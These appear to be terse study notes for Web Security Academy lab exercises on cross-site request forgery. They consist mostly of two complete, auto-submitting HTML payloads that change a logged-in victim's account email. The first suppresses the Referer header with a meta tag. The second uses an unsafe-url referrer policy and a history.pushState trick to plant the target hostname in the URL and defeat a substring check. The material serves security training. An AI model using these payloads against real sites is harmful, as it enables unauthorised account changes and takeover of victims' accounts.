
# 1 referer no check if not there

```js
<meta name="referrer" content="never">

<form method="POST" action="https://0a6300d5047a86fa80dc714000530019.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="abc@web-security-academy.net">
</form>

<script>
document.forms[0].submit();
</script>
```


---

# 2 referer only checks matched string

`Referrer-Policy: unsafe-url` <<< add this to header, forcing string matching

```js
<script>
history.pushState("", "", "/?0a6300d5047a86fa80dc714000530019.web-security-academy.net")
</script>

<form method="POST" action="https://0a6300d5047a86fa80dc714000530019.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="abc@web-security-academy.net">
</form>

<script>
document.forms[0].submit();
</script>
```

note... with `history.pushState` >>> "/?matched-string"
effectively >>> `Referer: https://your-exploit-server.web-security-academy.net/?0a6300d5047a86fa80dc714000530019.web-security-academy.net`

---
# end